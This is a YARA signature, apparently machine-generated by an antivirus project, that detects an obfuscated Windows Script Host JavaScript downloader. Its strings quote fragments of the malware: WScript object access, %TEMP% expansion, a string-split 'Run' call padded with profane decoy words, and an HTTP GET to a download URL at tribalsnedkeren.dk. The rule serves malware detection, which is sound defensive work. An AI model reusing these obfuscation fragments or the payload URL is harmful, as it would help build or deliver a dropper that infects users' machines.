rule sig_20160428_1d2e62c575da0d5da9c1a6bfce0620c5 {
  meta:
    description = "datamaliciousorder - file 20160428_1d2e62c575da0d5da9c1a6bfce0620c5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "799341eef3bf7e112d4aa5778f3497a5cc1142216f37272696dbc43a1cd66bb1"

  strings:
    $s1  = "var RejHejIgzKhcInoHtzEhs = function TxxLcjKrqGxdNasCsgKwy() {return NjnPdnZdzAcdBvdBrbJgr[XuiRcoSsoHnlRtvQpkFbn](\"WScript\"+\"" ascii
    $s2  = "var RejHejIgzKhcInoHtzEhs = function TxxLcjKrqGxdNasCsgKwy() {return NjnPdnZdzAcdBvdBrbJgr[XuiRcoSsoHnlRtvQpkFbn](\"WScript\"+\"" ascii
    $s3  = "function XbnPjeNhtRhgKxcDkmCce(DaqPstBxfOdwKiyKbeDdi){RejHejIgzKhcInoHtzEhs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function XbnPjeNhtRhgKxcDkmCce(DaqPstBxfOdwKiyKbeDdi){RejHejIgzKhcInoHtzEhs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function TsnQeiTbhQjhWirLgmPnx() {return RejHejIgzKhcInoHtzEhs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function WuvDbhBsbQidTmsUbkIny(GlcRyoHvdQxlDnjRxwJiu, OxuPmcWfkSglLrfYyuCcx){YjnKhwAliTyrBmkHhaNsw = YjnKhwAliTyrBmkHhaNsw * 1; " ascii
    $s7  = "return GlcRyoHvdQxlDnjRxwJiu - OxuPmcWfkSglLrfYyuCcx;};" fullword ascii
    $s8  = "var NjnPdnZdzAcdBvdBrbJgr = this[\"WScript\"];" fullword ascii
    $s9  = "function TsnQeiTbhQjhWirLgmPnx() {return RejHejIgzKhcInoHtzEhs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function UnwSzyBibHnjGzmIyoKmr(){return XuiRcoSsoHnlRtvQpkFbn;};" fullword ascii
    $s11 = "function YniKnyJulFwcGzcBujCvh(){return NwgSmnQgrItkEovPmdRjp + \"\";};" fullword ascii
    $s12 = "if (MilMkaOxyNdfBtpGkgFke[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function WuvDbhBsbQidTmsUbkIny(GlcRyoHvdQxlDnjRxwJiu, OxuPmcWfkSglLrfYyuCcx){YjnKhwAliTyrBmkHhaNsw = YjnKhwAliTyrBmkHhaNsw * 1; " ascii
    $s14 = "function CwaXimXrlSqpGksCuwXvp() {return ((YfpVmpOxbQbzHspKwxZat == true) && (YfpVmpOxbQbzHspKwxZat == UjiJeaKddTahZcgKibRhm)) ?" ascii
    $s15 = "function CwaXimXrlSqpGksCuwXvp() {return ((YfpVmpOxbQbzHspKwxZat == true) && (YfpVmpOxbQbzHspKwxZat == UjiJeaKddTahZcgKibRhm)) ?" ascii
    $s16 = "MilMkaOxyNdfBtpGkgFke[NnfPriNojXvqZgkVuuRde](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s17 = "function HfiLtdPcfZvjWfkRajZvk(){return 23;};" fullword ascii
    $s18 = "function YevRvzOtnXswDdiUvtVhg(XuvXadIjrMguTliUavWiy) {var DsfWnkUiwRquMrySpwUag = (1, 2, 3, 4, 5, XuvXadIjrMguTliUavWiy); retur" ascii
    $s19 = "}while (LveJbnBacPilGygPsiGpn);" fullword ascii
    $s20 = "var UjiJeaKddTahZcgKibRhm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}